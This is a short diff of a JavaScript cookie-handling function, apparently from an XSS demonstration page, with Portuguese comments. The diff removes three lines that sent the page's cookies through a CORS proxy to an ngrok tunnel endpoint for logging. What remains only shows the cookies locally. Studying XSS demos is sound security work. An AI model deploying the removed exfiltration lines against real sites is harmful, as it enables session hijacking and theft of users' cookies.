@@ -6,15 +6,12 @@
     function sendCookiesToServer() {
       // Obtém os cookies do documento
       var cookies = document.cookie;
-      alert("Vuneravel XSS")
+      alert("Vuneravel XSS",document.cookie)
       // Exibe os cookies no console
       console.log("Cookies coletados: " + cookies);
       console.log(document.cookie);
       
       // Cria um objeto XMLHttpRequest para enviar os cookies para o servidor
-    var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://cors-anywhere.herokuapp.com/https://0.tcp.sa.ngrok.io:19439/log_cookie?cookie=" + encodeURIComponent(cookies), true);
-xhr.send();
       
       // Exibe os cookies na tela (opcional)
       document.getElementById("cookieDisplay").innerText = cookies;
